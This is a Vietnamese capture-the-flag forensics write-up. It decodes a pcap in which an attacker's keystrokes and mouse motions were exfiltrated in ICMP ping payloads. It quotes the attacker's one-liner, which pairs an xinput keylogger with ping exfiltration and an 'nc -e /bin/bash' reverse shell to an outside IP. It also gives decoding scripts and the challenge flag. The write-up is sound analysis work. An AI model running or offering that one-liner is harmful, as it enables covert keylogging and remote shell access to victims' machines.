Mở file pcap ra và phân tích protocol hierarchy, ta thấy lượng lớn ICMP:
![image](https://github.com/NVex0/uWU/assets/113530029/61e34c0e-e5b4-4132-b396-fdbc82f38d5d)

Xem theo tcp stream, ta để ý server packet có đoạn có command như này:
`xinput test 8 | while read -r line; do hex_data=$(echo "$line" | xxd -p -c 10); echo "$hex_data" | while read -r data; do ping -c 1 -p "$data" 192.168.253.27; done; done > /dev/null 2>&1 & nc 192.168.253.27 5349 -e /bin/bash`
![image](https://github.com/NVex0/uWU/assets/113530029/011f5000-1a8e-4134-bbbc-be649a70cee2)

Cụ thể là nó lấy mỗi 10 bytes data từ xinput 8 (keyboard), sau đó ping tới 192.168.253.27 bằng data đó. Bây giờ ta tiến hành extract data và dịch lại đầu vào thôi :v 

Mình viết script sau để làm việc đó:
```
import os
import sys

keymap = {9: '<ESC>', 67: '<F1>', 68: '<F2>', 69: '<F3>', 70: '<F4>', 71: '<F5>', 72: '<F6>', 73: '<F7>', 74: '<F8>', 75: '<F9>', 76: '<F10>', 95: '<F11>', 96: '<F12>', 118: '<INS>', 119: '<DEL>', 49: '`', 10: '1', 11: '2', 12: '3', 13: '4', 14: '5', 15: '6', 16: '7', 17: '8', 18: '9', 19: '0', 20: '-', 21: '=', 22: '<BACKSPACE>', 23: '<TAB>', 24: 'q', 25: 'w', 26: 'e', 27: 'r', 28: 't', 29: 'y', 30: 'u', 31: 'i', 32: 'o', 33: 'p', 34: '[', 35: ']', 51: '\\', 66: '<CAPSLOCK>', 38: 'a', 39: 's', 40: 'd', 41: 'f', 42: 'g', 43: 'h', 44: 'j', 45: 'k', 46: 'l', 47: ';', 48: "'", 36: '<ENTER>', 52: 'z', 53: 'x', 54: 'c', 55: 'v', 56: 'b', 57: 'n', 58: 'm', 59: ',', 60: '.', 61: '/', 65: '<SPACE>', 111: '<UPARROW>', 113: '<LEFTARROW>', 116: '<DOWNARROW>', 114: '<RIGHTARROW>', 110: '<HOME>', 115: '<END>', 112: '<PGUP>', 117: '<PGDN>', 77: '<NUMLOCK>', 106: '<NUM/>', 63: '<NUM*>', 82: '<NUM->', 79: '<NUM7>', 80: '<NUM8>', 81: '<NUM9>', 83: '<NUM4>', 84: '<NUM5>', 85: '<NUM6>', 86: '<NUM+>', 87: '<NUM1>', 88: '<NUM2>', 89: '<NUM3>', 90: '<NUM0>', 91: '<NUM.>', 104: '<NUMENTER>', 134: '<RWIN>', 133: '<LWIN>'}

infile = sys.argv[1]
outfile = "hex.data"


os.system("tshark -nr %s -Y 'ip.src == 192.168.25.135 && icmp' -T fields -e data.data > %s" %((infile, outfile)))

#Set toogle để xử lí đầu ra.
toogle = True
with open("hex.data", "r") as f:
    data = f.readlines()
    for i in data:
        #Extract 10 bytes ra, packet 48 bytes nên cứ chọn chỗ nào đủ data là được :v, ở đây mình chọn từ 24 -> 44.
        out = bytes.fromhex(i[24:44]).decode('ASCII')
        if not toogle:
            z = out.split("\n")
            index = int(z[0][2:])
            if index in keymap:
            #Nếu index = 65, tức <SPACE> thì print luôn nhìn cho dễ :v
                if index == 65:
                    print(" ")
                else:
                    print(keymap[index], end = "")
        #Vì nó capture được 2 event: press và release. Vì thế nên ta phải xử lí để không bị trùng data.
        if "press" in out:
            toogle = False
        else:
            toogle = True
```
Run code trên kèm file pcap `python extract.py ActionCapture.pcapng`, ta được đầu ra như này:

![image](https://github.com/NVex0/uWU/assets/113530029/b441926e-eb85-42c4-bb29-a1caa01fda31)

Decimal flag, ném lên cyberchef và ta được part 1:

![image](https://github.com/NVex0/uWU/assets/113530029/23a0ce73-89c9-494f-a8ec-4a7aedc1febf)



Ok, tiếp part 2. Nhìn vào tcp stream 1, ta thấy được cách send data tương tự tcp stream 0, chỉ khác là xinput id 10 là chuột. Event của chuột sẽ gồm toạ độ x, y của cursor. Vẫn extract ra và dịch nó ra thôi :v 
```
with open("hex.data", "r") as f:
    data = f.readlines()
    for i in data:
        i = bytes.fromhex(i[24:44]).decode('ASCII')
        print(i, end = "")
```
Run script này vào save file `txt`:
`python tmp.py > txt`

File txt này chứa toàn bộ motion mà ta extract ra được, tiếp theo là dựng lại đường của cursor dựa trên toạ độ thôi :v 

Extract ra với script `Mickey.py`:
```
import matplotlib.pyplot as plt

x = []
y = []

with open("txt", "r") as f:
    data = f.readlines()
    for i in data:
        if "key" in i:
            continue
        elif "motion" in i:
            tmp = i.split(" ")
            x.append(int(tmp[1][5:]))
            y.append(int(tmp[2][5:]))
    plt.plot(x, y)
    plt.show()
```

Chạy file `Mickey,py`, được kết quả sau:

![image](https://github.com/NVex0/uWU/assets/113530029/93bd8a39-5fd4-40d4-be05-2d6487c433ae)

Flip nó lại theo chiều dọc, được part 2 của flag:
![Screenshot (3950)](https://github.com/NVex0/uWU/assets/113530029/7f4d1dad-d377-42b5-9233-e047b0296fc9)


FLAG : `KCSC{g00d_luck_have_fuN1337}`
